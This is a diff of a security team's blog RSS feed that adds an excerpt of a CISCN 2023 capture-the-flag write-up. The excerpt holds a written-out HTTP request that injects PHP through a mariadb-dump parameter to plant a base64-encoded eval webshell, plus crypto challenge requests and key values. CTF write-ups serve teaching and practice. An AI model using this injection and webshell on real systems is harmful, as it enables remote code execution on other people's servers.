@@ -6,7 +6,19 @@
     <description>Recent content in CISCN on or4nge</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 28 Jun 2022 17:17:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/tags/ciscn/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 29 May 2023 00:17:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/tags/ciscn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CISCN2023 初赛 Writeup by or4nge</title>
+      <link>https://or4ngesec.github.io/post/ciscn-2023-writeup-by-or4nge/</link>
+      <pubDate>Mon, 29 May 2023 00:17:17 +0800</pubDate>
+      
+      <guid>https://or4ngesec.github.io/post/ciscn-2023-writeup-by-or4nge/</guid>
+      <description>Web dumpit​ 传参：http://eci-2ze0qz28fupseaafoy24.cloudeci1.ichunqiu.com:8888/?db=%00&amp;amp;table_2_dump= 发现报错： 后端执行了 mariadb-dump 命令，利用这里向文件进行写入：
+GET /?db=&amp;#34;%3C%3Fphp%20file_put_contents(\&amp;#34;shell.php\&amp;#34;,base64_decode(\&amp;#34;PD9waHAgQGV2YWwoJF9HRVRbJ3NoZWxsJ10pOw==\&amp;#34;))%3F%3E&amp;#34;%20&amp;gt;%20log/a.php%20%0a&amp;amp;table_2_dump= HTTP/1.1​ Host: eci-2ze0qz28fupseaafoy24.cloudeci1.ichunqiu.com:8888​ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0​ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8​ Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2​ Accept-Encoding: gzip, deflate​ Connection: close​ Upgrade-Insecure-Requests: 1​ Pragma: no-cache​ Cache-Control: no-cache​ 访问 /log/a.php 写入 shell.php，然后读取环境变量得到flag：​ Crypto 基于国密SM2算法的密钥密文分发​ 这里使用在线加解密网站：https://const.net.cn/tool/​ 首先进行登录，获取身份标识：
+POST /api/login​ ​ {​ &amp;#34;name&amp;#34;:&amp;#34;&amp;#34;,​ &amp;#34;school&amp;#34;:&amp;#34;&amp;#34;,​ &amp;#34;phone&amp;#34;:&amp;#34;&amp;#34;​ }​ id=42126722-ec0b-42fa-a6c9-ef68cda87c61 然后利用网站随机生成公私钥，发送给服务器：​
+POST /api/allkey​ ​ {​ &amp;#34;id&amp;#34;:&amp;#34;42126722-ec0b-42fa-a6c9-ef68cda87c61&amp;#34;,​ &amp;#34;publicKey&amp;#34;:&amp;#34;5F6A85225F198657E9BD17A190ABA1C64A25DA3E0E6D2ADB76C9DC11501423F3C60A0E617EB798F6E3E393412A181BDBEB8883A73AC45EF78AB33A5B2B0DAE37​ }​ ​ ​ {​ &amp;#34;message&amp;#34;: &amp;#34;success&amp;#34;,​ &amp;#34;data&amp;#34;: {​ &amp;#34;publicKey&amp;#34;: &amp;#34;049df2742de79d5efe662e962bb6db289f0a2a18c56f514bc0a7697cd16f9e3460d0c001c323e79119d3378d9ca8bc600ffa9e4acdc122faa0bad7631aeec59c30&amp;#34;,​ &amp;#34;privateKey&amp;#34;: &amp;#34;125e7d92970266ca8ad0a6a83f71af24d49f3d1f6c9a30bfcfd415970285a67f&amp;#34;,​ &amp;#34;randomString&amp;#34;: &amp;#34;d1ab4c04b4d55381d89e6a35ab3612c24e8c8991e68d2398386c249ac55499ccb95c990949a08fff3801db48ae4e3c4b1e5fa0cd2cf7fded1b57085d01b2b7187f6c2ce87d86a80520be3b3ae041e0ab7bc49f77955923103200f7d68a09c1776afc8c8f8cf2877f4f55d1f6a4ab0818&amp;#34;,​ &amp;#34;id&amp;#34;: &amp;#34;42126722-ec0b-42fa-a6c9-ef68cda87c61&amp;#34;​ }​ } 使用私钥对 randomString 进行解密得到随机数 C=CC9DFC63D4F485F9F501008D1B00AB73，使用 C 作为密钥对 privatekey 进行 SM4 解密得到私钥明文 2D8A1CB7EFF29E02F2A85AFFDFF897679F0F48D486D8438E5CD4A7D2E0766738。​ 向服务器请求密钥 D：</description>
+    </item>
+    
     <item>
       <title>CISCN2022 华北分赛区 Writeup by or4nge</title>
       <link>https://or4ngesec.github.io/post/ciscn-2022-north-writeup-by-or4nge/</link>
